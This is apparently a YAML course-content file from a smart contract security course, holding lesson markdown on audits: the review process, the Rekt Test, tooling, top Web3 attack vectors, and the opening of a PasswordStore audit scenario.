          ```js
          function setUp() public {
              vm.createSelectFork({blockNumber: 0, urlOrAlias: "mainnet"})
          }
          ```

          > Note: `mainnet` will need to be set as an alias in your `foundry.toml` under a new variable `[rpc_endpoints]`

          ```js
          [rpc_endpoints];
          mainnet = "{MAINNET_RPC_URL}";
          ```

          With the above in place running the following will run your tests with respect to a fork of a live chain!

          ```bash
          forge test
          ```

          ## Useful Resources &amp; Exercises

          If any concepts covered in this blog post seem confusing or new to you, take a moment to check out the Foundry Full Course here on Updraft ([**Foundry Fundamentals**](https://updraft.cyfrin.io/courses/foundry) & [**Advanced Foundry**](https://updraft.cyfrin.io/courses/advanced-foundry)) to level up those concepts and give you all the information you need to succeed here. These resources will expedite your learning and help you solidify the fundamental concepts.

          Before signing off, I'd encourage you to join the [Cyfrin Discord](https://discord.com/invite/NhVAmtvnzr). This is an excellent platform where you can connect, collaborate, and share insights with a diverse group of people working on similar goals.

          In addition to this, check out the [**Discussions on GitHub**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/discussions) - this is a phenomenal place to get support and have your questions answered in a way that will be indexed by search engines and AI in an effort to improve the experience for people coming behind us.

          <img src="/security-section-1/14-fork-tests/forking1.png" style="width: 100%; height: auto;" alt="block fee">

          Congratulations on finishing the refresher! Take a break, you greatly deserve it for getting this far!

          ---

          Section 1 NFT Challenge üëÄ

          [Refresher NFT (Arb)](https://arbiscan.io/address/0x7a0f40757f6ba868b44ce959a1d4b8bc22c21d59)

          [Refresher NFT (Sepolia)](https://sepolia.etherscan.io/address/0x76d2403b80591d5f6af2b468bc14205fa5452ac0)
    type: new_section
    enabled: true
  -
    id: n1i91Vwp
    title: 'What is a smart contract audit'
    slug: audit
    lessons:
      -
        id: 5a691a25-f2f3-4e52-a6d6-7fbb09d85976
        type: new_lesson
        enabled: true
        title: 'What is a smart contract audit?'
        slug: what-is-an-audit
        duration: 10
        video_url: XQFbLD01uq85UnD00r4HRqNTLJR1N2SXmGzFieV5TaOi8
        raw_markdown_url: /routes/security/2-audit/1-what-is-an-audit/+page.md
        description: "This lesson delves into what a smart contract audit, or more accurately, a security review, truly entails. It discusses the three phases of a security review, the importance of these reviews in ensuring code security on immutable blockchain systems, and effective techniques used in the process. The lesson also emphasizes the distinction between the terms 'audit' and 'security review' and their implications in the context of blockchain and smart contracts."
        markdown_content: |-
          ---
          title: What is a Smart Contract Audit?
          ---

          _Follow along with this video:_

          ##

          ---

          You might think you've got a grip on what a smart contract audit is all about, but this lesson aims to help you dive deeper and truly comprehend the whole process. Brace yourself, as today we are stepping into the interesting realm of security reviews.

          Let's start off by stating that the term "smart contract audit" is a bit of a misnomer. As a more appropriate alternative, I am a stout advocate of "security review." I even have a T-shirt to prove my allegiance!

          You might be wondering why this change of terms is required. Well, it‚Äôs because the term 'audit' might wrongly insinuate some kind of guarantee or even encompass legal implications. A security review, being free of these misconceptions, exudes the essence of what we are actually doing: looking for as many bugs as possible to ensure maximum code security.

          > Note: Despite this, many protocols still insist on requesting a "smart contract audit," so it's eminent to know that the terms are interchangeable. When you hear "security review", think "smart contract audit" and vice versa. Protocols are often unaware of these nuances, but you, as a trained security researcher, know better!

          By now, I hope you're questioning with anticipation: "What does a security review entail?"

          ## The Three Phases of a Security Review

          Right in our GitHub repository, we detail the three phases of a security review and what that process looks like.

              1. Initial Review
                      a. Scoping
                      b. Reconnaissance
                      c. Vulnerability identification
                      d. Reporting
              2. Protocol fixes
                      a. Fixes issues
                      b. Retests and adds tests
              3. Mitigation Review
                      a. Reconnaissance
                      b. Vulnerability identification
                      C. Reporting

          To give you a heads-up, there really isn't a "one-size-fits-all" approach to smart contract auditing. There are several unique strategies, each bringing a different set of pros and cons to the table.

          In this course we'll discuss two particularly effective techniques, `"the Tincho"` and `"the Hans"`, to help familiarize you with the process. However, remember that these are just examples; there isn‚Äôt a definitive, "correct" way of performing a security review.

          Before we delve into the specifics, let's discuss why security reviews are critical.

          ## Importance of Security Reviews

          > A smart contract audit is a timeboxed, security based review of your smart contract system. An auditor's goal is to find as many vulnerabilities as possible and educate the protocol on ways to improve their codebase security and coding best-practices moving forward.

          As code deployed to a blockchain is immutable, it‚Äôs crucial that it's error-free before deployment. The permissionless and adversarial nature of the blockchain means that protocols need to be ready to repel malicious users. Failure to do so can lead to hefty monetary losses, as evidenced by the nearly $4 billion stolen due to smart contract vulnerabilities last year.

          The benefits of conducting a security review go beyond just minimizing vulnerabilities.

          It also aids protocol developers in enhancing their understanding of the code itself, thereby accelerating feature implementation and increasing effectiveness. A security review can also familiarize your team with the latest trends and tooling in the space.

          Often a single audit won't be enough, protocols are really entering into a security journey which may include:

          - Formal Verification
          - Competitive Audits
          - Mitigation Reviews
          - Bug Bounty Programs

          With this understanding, let's familiarize ourselves with the process of a typical audit.

          ### Reach Out for a Review

          The review process begins when a protocol reaches out, be it before or after their code is complete. After they make contact, it's important to determine the cost of a review based on things like:

          - Code Complexity/nSLOC
          - Scope
          - Duration
          - Timeline

          Lines of Code: Duration

          - 100 : 2.5days
          - 500 : 1 Week
          - 1000 : 1-2 Weeks
          - 2500 : 2-3 Weeks
          - 5000 : 3-5 Weeks
          - 5000+: 5+ weeks

          Take this with a lot of salt though, as these timelines vary largely based on circumstance.

          With the submission of a `commit hash` and `down payment` by the protocol and start date can be set!

          > Note: The `commit hash` is the unique ID of the codebase an auditor will be working with.

          ### Audit Begins

          Now that the admin work is done, auditors can roll up their sleeves and get to work. Using everything in their arsenal, they will strive to find as many vulnerabilities as possible in your code.

          ### Initial Report

          Once the review period is over, the auditors compile an initial report. This report includes all findings, categorized according to severity

          - High
          - Medium
          - Low
          - Information/Non-critical
          - Gas Efficiencies

          High, medium and low findings have their severity determined by the impact and likelihood of an exploit.

          Informational/Non-Critical and Gas are findings focused on improving the efficiency of your code, code structure and best practices. These aren't vulnerabilities, but ways to improve your code.

          ### Mitigation Phase

          The protocol's team then has a fixed period to address the vulnerabilities found in the initial audit report. More often than not, they can simply implement the recommendations provided by the auditors.

          ### Final Report

          Upon completion of the mitigation phase, the audit team compiles a final audit report focusing exclusively on the fixes made to address the initial report's issues. Hopefully, this cements a strong relationship between the protocol and the audit team, fostering future collaborations to keep Web3 secure.

          ## Ensuring a Successful Audit

          For an audit to be as successful as possible, you should ensure that there's:

          - Good documentation
          - A solid test suite
          - Clear and readable code
          - Modern best practices are followed
          - Clear communication channels
          - An initial video walkthrough of the code

          By considering auditors as an extension of your team, maintaining an open channel of communication, and providing them with the necessary documentation and context, you ensure the audit process is smoother and more accurate, providing auditors valuable context of the codebase.

          ## Post Audit

          Lastly, remember that a smart contract audit is an integral part of a security journey rather than an endpoint. Even after an audit, any subsequent code changes need to be reviewed as the new code is unaudited, regardless of the size of the change.

          > Remember: One audit might not be enough. Getting more eyes on your code is only going to increase the chances of catching vulnerabilities before it's too late

          ## What an audit _isn't_

          Going through a security review does not mean that your code is bug free. Security is a continuous process tha tis always evolving.

          ## In Closing

          This should have provided you a high-level understanding of what a security review is, what it's comprised of and what to expect while performing one.

          We'll detail some of the specific differences between `competitive` and `private` audits in a later section.

          > "There is no silver bullet in smart contract auditing. But understanding the process, methods, and importance of regular security reviews can significantly enhance your protocol's robustness."
      -
        id: 66f3d1fb-3ed8-4a12-9164-49b28b28281a
        type: new_lesson
        enabled: true
        title: 'The audit process'
        slug: the-audit
        duration: 5
        video_url: Um3uQhbBS2PBoz01L9dAdJAZ8m3EtU7KNdIX7Xjp02T0200
        raw_markdown_url: /routes/security/2-audit/2-the-audit/+page.md
        description: 'Learn about the smart contract audit process, explore key steps from initial context gathering to the final mitigation review.'
        markdown_content: |-
          ---
          title: The Audit (Security Review Process)
          ---

          _Follow along with this video:_

          ---

          When developing smart contracts, understanding and following the audit process is a crucial step towards achieving a more secure protocol. Here, we'll outline an example of this process.

          ## High-Level Overview of The Audit Process

          The smart contract audit process can be briefly summed up in these steps:

          1. **Get Context**: Understand the project, its purpose and its unique aspects.
          2. **Use Tools**: Employ relevant tools to scan and analyze the codebase.
          3. **Manual Reviews**: Make a personal review of the code and spot out unusual or vulnerable code.
          4. **Write a Report**: Document all findings and recommendations for the development team.

          To illustrate how this pans out in reality, we can look at the Tincho method used to audit ENS ‚Äì a process that landed him a cool $100,000 payout! We'll delve into this later on.

          ## Breakdown of the Audit Process

          For a more detailed perspective, let‚Äôs consider the process as broken into three distinct phases:

          **Initial Review:** The initial review of a protocol can also be broken down into 4 distinct phases.

          - Scoping - This is getting a sense of the protocol. In this phase, auditors go through the code to scope it. This gives an idea of how much time might be required for the audit, which can then be used to establish pricing. Key tasks include identification of all the contract‚Äôs dependencies and a general overview of the code. At this stage, auditors don‚Äôt dig deep into anything yet.
          - Reconnaissance - Here an auditor starts walking through the code, running tools, interacting with the protocol in an effort to break it.
          - Vulnerability Identification - An auditor determines which vulnerabilities are present and how they're exploited as well as mitigation.
          - Reporting - Compile a report detailing all of the identified vulnerabilities and recommendations to make the protocol more secure.

          > "Your job is to do whatever it takes to make the protocol more secure."

          **Protocol Fixes:** At this stage the protocol will take an auditor's report and work towards implementing suggested changes and mitigation. The length of time of this period can vary based on complexity of the issues, number of vulnerabilities identified and more.

          **Mitigation Review:** Once a protocol has employed and tested all of the recommended fixes, a review is conducted with a focus on verifying that previously reported vulnerabilities have been resolved.

          Your ultimate aim should be to make the protocol more secure. Therefore, ensure to take notes of all findings and steps and elaborate it in your report.

          > Difference in Audit Types: Note that the aforementioned process details a private audit or a traditional security review. For competitive audits, you are typically optimized for time and identifying as many high vulnerabilities as possible.

          Remember, the goal of conducting contract audits isn't simply to tick a box. It's about ensuring the security and smooth running of the smart contract at all stages of its lifecycle. The more audits you conduct, the better you become at identifying potential security issues.

          <div style="text-align:center">
          <img src="../../../../static/security-section-2/2-the-audit/the-audit1.png" style="width: 75%; height: auto;">
          </div>

          ## Embedding Security Audits in Development Lifecycle

          The process of developing a smart contract follows a lifecycle too. According to the [OWASP](https://www.owasp.org/index.php/Main_Page) (The Open Web Application Security Project) guide, security isn't just a one-off step but a part of your ongoing smart contract journey. It is about fostering the mindset that security is continuous. The smart contract developer lifecycle entails the following stages:

          1. **Plan and Design**
          2. **Develop and Test**
          3. **Get an Audit**
          4. **Deploy**
          5. **Monitor and Maintain**

          OWASP strongly emphasizes that embedding security considerations into all stages of your Development Lifecycle is what it takes to build a secure decentralized application, not just conducting a one time smart contract ‚Äúcheck.‚Äù Before deploying your contract, think hard about the security measures in place and ensure to maintain and monitor your code post-deployment.

          While a smart contract security audit is an absolute necessity, also ensure to plan for any contingencies post-deployment. The key takeaway here is this: Smart contract security is a crucial part of the smart contract development lifecycle and should be treated with as much care as the development of the smart contract itself.
      -
        id: 92351a2d-d6b4-4e2b-bcb5-885069e268d7
        type: new_lesson
        enabled: true
        title: 'Rekt test'
        slug: rekt-test
        duration: 4
        video_url: o8pD01qyek02l5jZzhkuYQUPMk1RosmjfV28tzk6N02Wqc
        raw_markdown_url: /routes/security/2-audit/3-rekt-test/+page.md
        description: "This lesson introduces the Rekt Test, a set of critical questions designed to assess a protocol's readiness for a security audit."
        markdown_content: |-
          ---
          title: Rekt Test
          ---

          _Follow along with this video:_

          ---

          ## Audit Readiness

          The concept that once you've had an audit done, you're ready to ship - is wrong. There are two tests that I tell everyone to look at prior to getting a security review one is the [**nacentxyz simple-security-toolkit**](https://github.com/nascentxyz/simple-security-toolkit) and the other is [**The Rekt Test**](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/), by Trail of Bits.

          ### The Rekt Test

          The Rekt Test is highly important as it poses a set of questions to gauge your protocol's preparedness for an audit. This tool forces you to think about security measures from a more proactive angle. Should your protocols fail to answer these questions, the chances are that they're not audit-ready.

          <img src="/security-section-2/3-rekt/rekt1.png" style="width: 100%; height: auto;">

          The questions touch on several aspects like documentation, security roles, security tools, and protective measures, among others. Here's a curated list:

          - **Do you have all actors roles and privileges documented?**
          - **Do you keep documentation of external services contracts and Oracles?**
          - **Do you have a written and tested incident response plan?**
          - **Do you document the best ways to attack your system?**
          - **Do you perform identity verification and background checks on all employees?**
          - **Do you have a team member with security defined in the role?**
          - **Do you require hardware security keys for production systems?**
          - **Do you define key invariants for your system and test them on every commit?**
          - **Do you use the best automated tools to discover security issues in your code?**
          - **Do you undergo external audits and maintain a vulnerability disclosure or bug bounty program?**
          - **Have you considered and mitigated avenues for abusing users of your system?**

          As developers, you must be able to answer all these queries before you proceed with an audit. If you're dealing with a protocol that fails to answer these questions, it's best to tell them the protocol isn't ready to ship, or arguably audit, until they can.

          > "Delegate responsibility to someone on your team for security - Give your project a sense of ownership and a point person to handle any security breaches."

          ### Nascent Audit Readiness Checklist

          [**This**](https://github.com/nascentxyz/simple-security-toolkit) checklist is another effective method to assess if you're ready for an audit. Though it offers different perspectives, it's another tool that helps you determine if your protocols are prepared for audits.

          ### Next Steps and Post Deployment

          We'll later cover the important of Post Deployment Planning and all that entails, including:

          - Bug Bounty Programs
          - Disaster Recovery Drills
          - Monitoring

          Thinking about the steps necessary _after_ deployment really frames a protocols security holistically and ensures readiness to deal with potential exploits and ability to respond quickly.
      -
        id: 27302144-7410-43ef-939a-a772d20cbed8
        type: new_lesson
        enabled: true
        title: 'Security Tools'
        slug: tools
        duration: 5
        video_url: EKJ02V7fAflkO2wJLhBp8K4oztVnAY5vzb902OBL2znZM
        raw_markdown_url: /routes/security/2-audit/4-tools/+page.md
        markdown_content: |-
          ---
          title: What tools do we use in Security Reviews?
          ---

          _Follow along with this video:_

          ---

          ## Tools for Security Reviews

          Let's overview some of the tools we'll be using while performing security reviews. As we progress in the course, you'll get more hands on experience with how they work!

          ### Your First Line of Defense: Test Suites

          Your classic test suite is your project's first line of defense. These are your frameworks like Foundry, Hardhat, Brownie, Apeworx - even Remix has tests.

          > _Rest in Peace Truffle_ üò¢

          This course covers some really robust test suites that you can model your tests after and we'll talk more about the concept of `test coverage` a little later on.

          ## Static Analysis: Debugging Without Execution

          Static analysis represents the next level of defense. This method automatically checks for issues without executing your code, hence the debugging process remains `static`. Slither, 4nalyzer, Mythril, and Aderyn are some prominent tools in the static analysis category.

          Throughout this course, we'll work heavily with Slither and Aderyn, you'll become experts at these static analysis options.

          ## Fuzz Testing: Randomness Meets Tests

          Next we have Fuzz testing, which really comes in two flavours, `fuzz testing` and `stateful fuzz testing`.

          <img src="/security-section-2/4-tools/tools2.png" style="width: 100%; height: auto;">

          A few other types of testing we _won't_ be covering are `differential test` and `chaos tests`, but in an effort to further you security journey, you always want to be looking for new looks and expanding your knowledge, so you may want to check them out.

          ## Formal Verification: Mathematical Proofs

          Formal verification is a broad term for deploying formal methods to affirm the correctness of hardware or software. Often, these methods involve converting the codebase into mathematical expressions and deploying mathematical proofs to authenticate that the code does or doesn't do something specific.

          A popular formal verification approach is symbolic execution. This method converts your Solidity function into math or a set of boolean expressions. Manticore, Certora, Z3 stand tall in this domain.

          We will delve deeper into formal verification in later sections.

          ## AI Tools: Not Quite There Yet

          Lastly but importantly, AI tools offer another dimension to imagine code auditing functionalities. However, despite their potential, they have some distance to cover before they provide substantial value for securing a codebase. At present, using AI tools could serve as a sanity check or aid in looking for something quickly, but if a project suggests it has been audited by an AI tool like `ChatGPT`, it is best to be skeptical and question if the project takes security seriously.

          There's a great GitHub repo by ZhangZhuoSJTU that illustrates examples of bugs that are detectable by machines and those that aren't. Check it out [**here**](https://github.com/ZhangZhuoSJTU/Web3Bugs).

          ## Wrapping Up

          An important takeaway for you is that around **80%** of actual bugs and competitive audit bugs are not auto-detectable by machines, _including our present-day AI tools_. This revelation underlines two key facts:

          1. Our current tools aren't up to the mark, and we need better ones.
          2. Human auditors and human security researchers remain paramount. The vast majority of bugs often stem from business logic and incorrect implementations rather than common solidity or cryptography oddities.

          You'll learn more about this distinction as we continue in this course.
        description: 'Discover various smart contract auditing tools, including static analysis tools like Slither and Aderyn, fuzzing methods, formal verification, and AI.'
      -
        id: 0c8d34f8-8bce-4d6c-9370-e85de0d4be31
        type: new_lesson
        enabled: true
        title: 'What if a protocol I audit gets hacked?'
        slug: hacked
        duration: 4
        video_url: LVwtMj026jE4kCW6yEa3EVd8PPAuoKpANRGeDw902ClTs
        raw_markdown_url: /routes/security/2-audit/5-hacked/+page.md
        markdown_content: |-
          ---
          title: What if I do a Security Review and the protocol gets hacked?
          ---

          _Follow along with this video:_

          ---

          # Penetrating the Scenario: What If Your Security Audit Fails?

          As the world moves towards a more digital infrastructure, the importance of security audits cannot be overstated. But who carries the blame when these audits fail? Should it always land at the feet of those responsible for conducting the audit?

          While broaching upon this intricate subject, I recently had a pleasant chat with the legendary Tincho, who imparted an inspiring perspective. He offers valuable insights on the way we should perceive the role and responsibilities of auditors in these precarious scenarios. Below will be summaries based on his thoughts and perspective.

          ## Redefining the Role of Auditors

          In the eyes of many, the fundamental purpose of a security audit is to identify and rectify the most critical vulnerabilities in a system. However, Tincho encourages us to look beyond this simplistic view.

          > Auditors should provide value, regardless of whether or not they spot critical issues.

          In other words, an auditor's value doesn't solely rest upon their ability to find vulnerabilities. Instead, their advice should strengthen the overall security protocol and offer pragmatic solutions for future scenarios.

          Of course, it goes without saying that the fewer critical vulnerabilities that are overlooked, the better - the safer Ethereum will be. It's naive however to believe that an auditor is solely responsible for when things go wrong.

          ## Who Owns the Blame?

          The notion of finding a scapegoat when a system is exploited is a regressive one.

          > A whole chain of events leads to the successful exploitation of a vulnerability.

          Attributing the failure of a system to an auditor's incompetency is simplistic and misguided. If a vulnerability was missed, it means it slipped past numerous stages of checks and balances, of which an audit is just one. When a flaw goes unnoticed for as long as four months, there are perhaps lapses in system monitoring and in many other security parameters.

          ## The Auditor‚Äôs Role in the Wake of a Breach

          So, what should an auditor do if a protocol they've reviewed ends up compromised? The answer is that a responsible security partner should not abandon their client in the midst of a crisis.

          As an auditor, you may be able to help mitigate the damage, restrict the scope of the attack, and possibly identify the hackers. A quality auditor must be there, lending their expertise, during the inevitable chaos that ensues after a breach.

          > "If you are to be the trusted security partner of your clients, probably, when they are hacked, you want to be there. You want to be there supporting them." - Tincho

          ## Conclusion

          Security is a journey.

          It was great catching up with Tincho, whose outlook on security audits balances realism with the optimistic pursuit of improvement. Every party involved in a security protocol must work together as a team and learn from any failure to ensure a safer, more secure digital environment.
        description: "Security reviews can't guarantee prevention against hacks; To what extent should a security reviewer feel responsible and what should they do?"
      -
        id: 100452f0-5541-4c78-9d25-a8c86e433cfa
        type: new_lesson
        enabled: true
        title: 'Top Web3 Attacks'
        slug: attacks
        duration: 1
        video_url: zwmJv9KnDfe8zgCio1oR00AM2w95AXpfXYWoqXxQEdjE
        raw_markdown_url: /routes/security/2-audit/6-attacks/+page.md
        markdown_content: |-
          ---
          title: Top kinds of Attacks in Web3 Today
          ---

          _Follow along with this video:_

          ---

          As I've mentioned a few times, we need to have this **attackers and defenders mindset**. We need to always be expanding our knowledge, we need to always be leveling up.

          As we progress I'll be giving you a tonne of tools to learn and grow your skill set. In addition to this, there will be exercises throughout for you to continue to seek that knowledge and really commit it.

          ### Unraveling the Top Attack Vectors

          Lets consider the weakest parts of Web3 and remind everyone with the **‚ÄúTop Attack Vectors.‚Äù**

          1. **Private Keys** - Stolen Private Keys are responsible for the largest loss of funds so far in 2023 at `$243,000,000`
          2. **Reward Manipulation** ‚Äì This vector involves the manipulation of decentralized incentive systems that could disrupt the balance and fairness within a network. `$200,000,000` has been rugged so far this year.
          3. **Price Oracle Manipulation** ‚Äì This threat arises when a price oracle in centralized, or if a single oracle is relied upon, particularly with respect to price data. These vulnerabilities are responsible for `~$146,000,000` in losses in 2023.
          4. **Insufficient Access Controls** ‚Äì onlyOwner modifiers, multi-sig wallets - just a couple things that could have preventing `$17,000,000` in stolen funds this year.
          5. **Re-entrancy(and Read-Only Re-entrancy)** - by not adhering to proper Checks, Effects, Interactions patterns - protocols are still being rekt to the tune of `$20,500,000` combined in 2023.

          Millions more have been lost across various, well-documented, and preventable attack vectors. The situation clearly illustrates how education is half the battle.

          Collectively, we will tackle these bugbears and issues in our forthcoming security reviews.

          > Always remember, my friends - Cybersecurity isn't about the systems or the codes; it's about maintaining a mindset. A mindset akin to an endless game of chess, predicting the opponent‚Äôs moves and always staying a step ahead.

          ### Engaging in Persistent Learning and Improvement

          In the forthcoming series of security audits, you'll get hands-on practice with data analysis, encryption methods, tackling suspicious scripts, and combating various cybersecurity threats. The exercises will stimulate your intellectual growth and help ingrain essential concepts into your tech-strategist mind.
        description: 'Developing an attacker-defender mindset & continuous learning in cybersecurity skills. Exploring attack vectors like private key exploitation & price oracle manipulation. Emphasizing learning through exercises & tools.'
      -
        id: 42962aa0-116e-45ae-8c31-2d01d7313526
        type: new_lesson
        enabled: true
        title: Recap
        slug: recap
        duration: 3
        video_url: 8Htqm7N3yiDLZqakaXKmOhsbnAeYVOqv4BCJP8s8XVE
        raw_markdown_url: /routes/security/2-audit/7-recap/+page.md
        markdown_content: |-
          ---
          title: Lesson 2 Recap
          ---

          _Follow along with this video:_

          ---

          Congratulations! You've come so far already, let's do a quick recap of what's been covered in this section.

          ### The Basics of Smart Contract Audits

          A smart contract audit is a time-boxed security review, looking for security vulnerabilities. The goal here is to inform the protocol on how to be as secure as possible.

          ### The Fundamentals of a Security Review

          There's no `silver bullet` when it comes to how to perform a security review. Generally, a security review is divided into three stages:

          1. Initial review
             - Scoping
             - Reconnaissance
             - Vulnerability Identification
             - Reporting
          2. Protocol Fixes
             - Protocol fixes issues
             - Retests and adds tests for changes
          3. Mitigation Review
             - Reconnaissance
             - Vulnerability Identification
             - Reporting

          ### Smart Contract Development Life Cycle

          Keep in mind that ensuring security isn‚Äôt only a crucial point in the smart contract development lifecycle, it's a continuous, never-ending process!

          - Plan & Design
          - Develop & Test
          - Smart Contract Audit & Post Deploy Planning
          - Deploy
          - Monitor & Maintain

          > "_Security shouldn't just be an afterthought or some box you check. You need to have a security mindset from day one_".

          Thinking about post-deployment planning, monitoring and maintaining is just as important as the development itself.

          ### Tooling for Security Review

          In future posts, we'll be delving into the various tools utilized in conducting security reviews. Trust me, you'll need to get your hands dirty with tools like

          Static Analysis

          - [Slither](https://github.com/crytic/slither)
          - [Aderyn](https://github.com/Cyfrin/aderyn)

          Fuzzing/Invariant Tests

          - [Foundry Test Suite](https://github.com/foundry-rs/foundry)

          Formal Verification

          - [Certora](https://www.certora.com/)

          AI

          - [Phind](https://www.phind.com/search?home=true)
          - [ChatGPT](https://chat.openai.com)
          - [Co-Pilot](https://github.com/features/copilot)
          - [AI Limitations](https://github.com/ZhangZhuoSJTU/Web3Bugs)

          ### Audit Readiness

          Before a protocol is even ready for an audit, they should consider where they stand on the [**Rekt Test**](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/) or other checklists like nacentxyz's [**simple-security-toolkit**](https://github.com/nascentxyz/simple-security-toolkit)

          ### Always be Learning

          We need to always be improving as security researchers and adopt an `attacker vs defender` mindset. It's only by staying informed and constantly improving that we can stay ahead of the problem.

          We touched on top attack vectors that are hitting Web3 to this day (including re-entrancy which has been around since _2016!_).

          Hopefully, with you taking this course we can learn from the mistakes in the past and finally reign in the exploitation in Web3.
        description: 'Recap smart contract auditing process and importance, with emphasis on security throughout development lifecycle, tools like static analysis and fuzzing, phases of review, and attack factors.'
      -
        id: 4c9a5a26-4242-41f9-8764-093d3776afef
        type: new_lesson
        enabled: true
        title: Exercises
        slug: exercises
        duration: 3
        video_url: vM5P9GThlMPgtYln1Dsj3dlIjAeXh02UeCO58Cidjt01M
        raw_markdown_url: /routes/security/2-audit/8-exercises/+page.md
        markdown_content: |-
          ---
          title: Exercises
          ---

          _Follow along with this video:_

          ---

          ### Section 2: Excercises

          ---

          üéØ Exercise: `Sign up for at least 1 security/web3 newsletter!`

          The reason this is so important is that you are now a security _researcher_. Keyword - `researcher`. You need to constantly be learning and taking in new things.

          In this course we're going to be studying other people's reports, studying other audits (using a tool called [**Solodit**](https://solodit.xyz/)) and we'll be continuously learning from previous exploits.

          > Exploits in the space are learning opportunities for us to improve as security researchers.

          Here are some newletters/resources to check out:

          - [Blockchain Threat Intelligence](https://newsletter.blockthreat.io/?r=2mgsm7) (referral link)
          - [Solodit](https://solodit.xyz/)
          - [Rekt](https://rekt.news/)
          - [Week In Ethereum](https://weekinethereumnews.com/)
          - [Consensys Diligence Newsletter](https://consensys.io/diligence/newsletter/)
          - [Officer CIA](https://officercia.mirror.xyz/)

          With all that said, you've now completed the high-level overview of what this process looks like. You should be very proud of yourself.

          Take a break and prepare to dive into our first audit together - Puppy Raffle.

          Section 2 NFT Challenge üëÄ

          [Hardest one of the whole course (Arb)](https://arbiscan.io/address/0xeab9c7ac697408fd1581494577c7c0716c3b75e6)

          [Hardest one of the whole course (Sepolia)](https://sepolia.etherscan.io/address/0x34d130b174f4a30a846fed7c02fcf53a19a4c2b6#code)
        description: 'Sign up for security newsletters, stay updated, learn about hacks & exploits.'
    type: new_section
    enabled: true
  -
    id: Qq1zlfUU
    title: 'Your First Audit | PasswordStore'
    slug: first-audit
    lessons:
      -
        id: 074d29d9-9aac-4daf-b61f-3b040acc2acd
        type: new_lesson
        enabled: true
        title: 'Your First Security Review'
        slug: first-review
        duration: 5
        video_url: xi009v02oVduUZvKxmOSpvgVJ9gMiT5uVH5hpYpposeNk
        raw_markdown_url: /routes/security/3-first-audit/1-first-review/+page.md
        markdown_content: |-
          ---
          title: Your First Security Review
          ---

          _Follow along with this video:_

          ---

          Welcome everyone! I hope you're well-rested, rehydrated, and ready to dive into the nitty-gritty of how smart contract audits work. We've had a good start with a high-level overview of what a smart contract audit or a security review contains. Now, we're going to go a level further by conducting not one, but a handful of audits over the next 6 sections.

          This is an exciting journey to improve our understanding of audits. We'll strengthen our knowledge and learn from some of the best people in the world such as Hans, the number one competitive auditor in the world for the first half of 2023. Now let‚Äôs kick things off with the Password Store audit.

          ### The PasswordStore Audit: A Closer Look

          For out first audit we're immersing ourselves into a scenario where we're auditing the PasswordStore protocol, just like you could if you were working for a firm like Cyfrin. It's a very immersive and experiential way of learning as we'll be adopting the role of a security researcher who has just received an audit request from a protocol.

          In later lessons we'll also go through the process of submission findings in a competive scenario like `CodeHawks`

          <img src="/security-section-3/1-review/firstaudit1.png" style="width: 100%; height: auto;">

          ### The End Goal

          Before jumping into this process ourselves, I'd like us to look at what we're striving towards. Below you can find links to the PasswordStore repo at various phases of an audit.

          - [**Security Review CodeV1**](https://sepolia.etherscan.io/address/0x2ecf6ad327776bf966893c96efb24c9747f6694b)
          - [**Security Review CodeV2**](https://github.com/Cyfrin/3-passwordstore-audit)
          - [**Security Review CodeV3**](https://github.com/Cyfrin/3-passwordstore-audit/tree/onboarded)
          - [**Security Review Final**](https://github.com/Cyfrin/3-passwordstore-audit/tree/audit-data)

          Take a look specifically at `Security Review Final`. The `audit-data` folder contains all the things you'll be able to build by the end of this section, including a professional PDF audit report.

          ### Remember the Phases

          It‚Äôs important to remember the phases for each audit or security review. They include:

          1. Initial Review
             - Scoping
             - Reconnaissance
             - Vulnerability Detection
             - Reporting
          2. Protocol Fixes
             - Fixes issues
             - retests and adds tests
          3. Mitigation Review
             - Reconnaissance
             - Vulnerability Detection
             - Reporting

          In this course, our main focus will primarily be on how to perform your initial review.

          We're starting out small with a codebase of less than 20 lines, but this is just the beginning. It's important to remember that _you_ are the security researcher and often times what may be clear or obvious to you, isn't to a protocol. Your expertise is valuable.

          So, with the expectations set and our targets defined, let's move ahead and commence our very first smart contract audit or security review. We'll start off with a scenario that will help us better understand what our roles as auditors will look like.
        description: "All the things we'll cover in this section! High-level info. Learn to conduct audits, prepare PDF reports, scope, reconnaissance, vulnerability identification & reporting."
      -
        id: 2024196b-0a32-4a2e-a04b-da11d01beb92
        type: new_lesson
        enabled: true
        title: 'Scoping: Etherscan'
        slug: etherscan
        duration: 6
        video_url: TBBnNcYbNpBbC2KO0100y2ZltsqKEF8F7StV2LDM7JKv8
        raw_markdown_url: /routes/security/3-first-audit/2-etherscan/+page.md
        markdown_content: |-
          ---
          title: Scoping Raw Etherscan
          ---

          _Follow along with this video:_

          ---

          ## Phase 1: Scoping

          In this lesson, we'll examine the initial steps of performing a security review using our PasswordStore codebase. I'm going to take a deep-dive into the scoping phase, which is the primary step in conducting a security review.

          ### The Scoping Phase and Initial Review

          The scoping phase is the point we initially receive a codebase for review and we perform a high level assessment.

          Imagine a scenario like this:

          _CLIENT: "Hi, we're the PasswordStore dev team looking to get our codebase audited ASAP to get it listed officially."_

          _AUDITOR: "Hi PasswordStore, I'm beginner-auditor. Really excited to help. Could you send your codebase to me?"_

          _CLIENT: "Sure, here's the etherscan link to our codebase." [**PasswordStore CodeV1**](https://sepolia.etherscan.io/address/0x2ecf6ad327776bf966893c96efb24c9747f6694b)_

          This exchange is all too common, and it's horrible. It's your responsibility as a security researcher to not audit codebases provided to you in this way.

          Why?

          As security researchers, you're looking for more than bugs. You're looking for code maturity. If all you have is a codebase on etherscan, if there's no test suite, if there's no deployment suite you should be asking: `how mature is this code?`

          > **Remember: Secure protocols not only safeguard the code but also our reputation as researchers. They will likely blame us for a security breach if we've audited a compromised codebase.**

          If all they provide is an etherscan link, can you assure the protocol's safety? In these cases, the answer is a resounding **NO**.

          ### Audit Readiness

          One of the first things we covered when discussing preparing for an audit was the concept of `Audit Readiness` and steps protocols should take prior to requesting an audit.

          You should recall the [**Rekt Test**](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/) from a previous lesson.

          How does your client's protocol stand up against these questions?

          <img src="/security-section-2/3-rekt/rekt1.png" style="width: 100%; height: auto;">

          If all they've provided you is an Etherscan link - the answer is poorly.

          > **If you're offered monetary reward to audit an Etherscan-only codebase, that's a red flag. Say NO. Doing otherwise contradicts our mission to promote secure protocols.**

